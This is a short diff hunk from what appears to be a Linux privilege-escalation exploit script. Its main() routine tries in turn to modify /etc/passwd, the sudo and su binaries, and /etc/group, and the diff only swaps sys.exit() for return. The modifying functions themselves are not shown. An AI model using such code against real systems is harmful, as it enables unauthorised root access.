@@ -362,23 +362,23 @@ def main():
     print(f'[*] Attempting to modify /etc/passwd') 
     if check_etc_passwd():
         run_etc_passwd()
-        sys.exit()
+        return
     print(f'[X] Cannot modify /etc/passwd') 
     
     print(f'[*] Attempting to modify sudo binary') 
     if check_elf('sudo'):
         run_elf('sudo')
-        sys.exit()
+        return
     print(f'[X] Cannot modify sudo binary') 
     
     print(f'[*] Attempting to modify su binary') 
     if check_elf('su'):
         run_elf('su')
-        sys.exit()
+        return
     print(f'[X] Cannot modify su binary') 
     
     print(f'[*] Attempting to modify /etc/group') 
     if check_etc_group():
         run_etc_group()
-        sys.exit()
+        return
     print(f'[X] Cannot modify /etc/group') 
